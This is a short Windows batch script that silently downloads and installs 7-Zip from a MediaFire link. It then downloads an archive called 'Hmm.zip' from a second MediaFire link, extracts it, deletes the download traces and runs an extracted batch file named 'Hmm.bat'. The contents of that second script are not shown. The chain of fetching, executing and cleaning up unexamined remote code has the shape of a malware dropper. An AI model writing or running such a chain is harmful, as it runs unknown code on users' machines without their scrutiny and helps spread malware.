@echo off

powershell -Command Invoke-WebRequest https://download2260.mediafire.com/spn9d0q60hwg/w4itdhejvxdefxk/7z2106-x64.exe -OutFile 7zip.exe

start /wait 7zip.exe /S

del /s /f /q 7zip.exe

powershell -Command Invoke-WebRequest https://download1477.mediafire.com/lz3crk3r5jsg/ytdyk5jhftvfjnb/Hmm.zip -OutFile Hmm.zip

"C:\Program Files\7-Zip\7z.exe" e Hmm.zip

rd /s /q "C:\Users\Abdul\Desktop\Hmm"

del /s /f /q "C:\Users\Abdul\Desktop\Hmm.zip"

move "C:\Users\Abdul\Desktop\Hmm.bat" "C:\Users\Abdul\Downloads"

"C:\Users\Abdul\Downloads\Hmm.bat"